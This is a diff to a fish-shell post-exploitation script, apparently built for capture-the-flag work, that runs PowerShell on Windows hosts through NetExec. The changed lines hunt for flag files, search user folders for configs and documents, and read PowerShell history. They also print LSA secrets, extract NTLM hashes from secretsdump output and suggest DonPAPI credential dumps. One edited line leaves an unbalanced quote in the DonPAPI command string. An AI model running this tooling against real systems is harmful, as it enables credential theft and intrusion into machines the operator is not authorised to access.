@@ -179,14 +179,15 @@ Examples:
     ezpz_header "Extracting secrets..."
 
     ezpz_info "Searching for flag files (flag.txt, user.txt, root.txt)"
-    set cmd "Get-ChildItem -Path C:/ -Recurse -Force -Include flag.txt,user.txt,root.txt -ErrorAction SilentlyContinue | ForEach-Object { Write-Host \"=== \$_.FullName ===\"; Get-Content \$_.FullName }"
+    set cmd 'Get-ChildItem -Path C:/ -Recurse -Force -Include flag.txt,user.txt,root.txt -ErrorAction SilentlyContinue | ForEach-Object { Write-Output "[FOUND] $($_.FullName)"; Get-Content $_.FullName }'
+
     ezpz_cmd $cmd
     nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$' | sort -u
 
     ezpz_info "Searching for interesting files in user folders"
     set cmd "Get-ChildItem -Path C:/Users -Force -Recurse -Depth 3 -Include *.config,*.xml,*.json,*.yml,*.yaml,*.log,*.bak,*.old, *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ps1,*.bat, *.exe -ErrorAction SilentlyContinue | Select-Object FullName"
     ezpz_cmd $cmd
-    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$' | grep -vi 'appdata' | grep -vi 'local settings' | grep -vi 'application data' | sort -u
+    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$' | grep -vi 'appdata' | grep -vi 'local settings' | grep -vi 'application data' | grep -vi 'all users' | sort -u
 
     ezpz_info "Extracting shell history (PowerShell and CMD)"
     set cmd "Get-ChildItem -Path C:/Users/*/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/*.txt -ErrorAction SilentlyContinue | ForEach-Object { Get-Content \$_.FullName -ErrorAction SilentlyContinue }"
@@ -251,7 +252,7 @@ Examples:
             ezpz_info "Printing LSA secrets"
             cat "$secretsdump_output_base.secrets"
             # Filter and collect NTLM hashes for consolidation (improved regex to catch special chars)
-            cat "$secretsdump_output_base.secrets" | grep -oE '^[^:]+:[^:]*:[0-9a-f]{32}:[0-9a-f]{32}' | awk -F: '{print $1":"$4}' >> "$tmp_this_target_collection"
+            cat "$secretsdump_output_base.secrets" | grep -E '[0-9a-f]{32}:[0-9a-f]{32}' | awk -F: '{print $1":"$3}' >> "$tmp_this_target_collection"
         end
 
         # Process .ntds file (NTDS.DIT hashes)
@@ -292,7 +293,7 @@ Examples:
 
         if test -n "$donpapi_auth_arg_string"
             ezpz_cmd "Next Step: Try dumping DPAPI master keys and credentials with DonPAPI:"
-            ezpz_info "donpapi collect -t $target -u \"$_flag_username\" $donpapi_auth_arg_string --ntfile \"$all_parsed_hashes_file_root\""
+            ezpz_info "donpapi collect -t $target -u \"$_flag_username\" $donpapi_auth_arg_string --ntfile \"$this_target_parsed_file"
         else
             ezpz_warn "DonPAPI suggestion skipped: No password or hash provided for authentication."
         end
@@ -300,7 +301,7 @@ Examples:
         ezpz_warn "DonPAPI not found. Skipping suggestion."
     end
 
-    echo ""
+    echo
 
     # Cleanup temporary file
     if test -f "$tmp_this_target_collection"
